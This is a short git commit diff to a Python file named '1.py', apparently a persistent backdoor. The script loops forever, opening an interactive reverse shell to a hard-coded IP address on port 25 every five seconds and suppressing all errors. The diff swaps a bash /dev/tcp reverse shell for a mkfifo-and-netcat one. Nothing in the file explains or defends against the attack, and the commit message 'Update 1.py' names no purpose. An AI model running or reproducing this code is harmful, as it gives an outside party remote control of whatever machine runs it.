2a82e4859bf0420202e1eb6d1df7257f990a9573
code-scan <cond0r@126.com>
2015-12-02 16:37:00 +0800

    Update 1.py

--- 1.py
+++ 1.py
@@ -2,7 +2,7 @@ import os
 import time
 while 1:
     try:
-        os.popen('exec 9<> /dev/tcp/209.9.108.169/25;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i')
+        os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 209.9.108.169 25 >/tmp/f')
         time.sleep(5)
     except:
         pass
